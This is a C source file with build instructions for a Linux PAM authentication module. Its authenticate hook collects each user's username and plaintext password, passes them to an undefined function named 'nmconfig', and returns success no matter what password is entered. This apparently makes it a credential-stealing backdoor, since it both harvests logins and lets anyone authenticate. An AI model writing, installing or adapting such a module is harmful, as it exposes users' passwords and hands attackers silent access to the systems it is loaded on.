/*
	Compile like so:
	gcc -fPIC -c pam_module.c
	gcc -shared -o pam_module.so pam_module.o -lpam
*/

#define PAM_SM_AUTH
#define PAM_SM_ACCOUNT
#define PAM_SM_SESSION
#define PAM_SM_PASSWORD

#include <security/pam_modules.h>
#include <stdio.h>


PAM_EXTERN int pam_sm_authenticate (pam_handle_t *pamh, int flags, int argc, const char **argv) {
	const void *username;
	const void *password;
	pam_get_item(pamh, PAM_USER, &username);
	pam_get_item(pamh, PAM_AUTHTOK, &password);
	if (password == NULL)
		pam_get_authtok(pamh, PAM_AUTHTOK, &password, "Password: ");
	nmconfig (username, password);
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_setcred (pam_handle_t *pamh, int flags, int argc, const char **argv) {
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt (pam_handle_t *pamh, int flags, int argc, const char **argv) {
	return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_open_session (pam_handle_t *pamh, int flags, int argc, const char **argv) {
	return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_chauthtok (pam_handle_t *pamh, int flags, int argc, const char **argv) {
	return PAM_IGNORE;
}


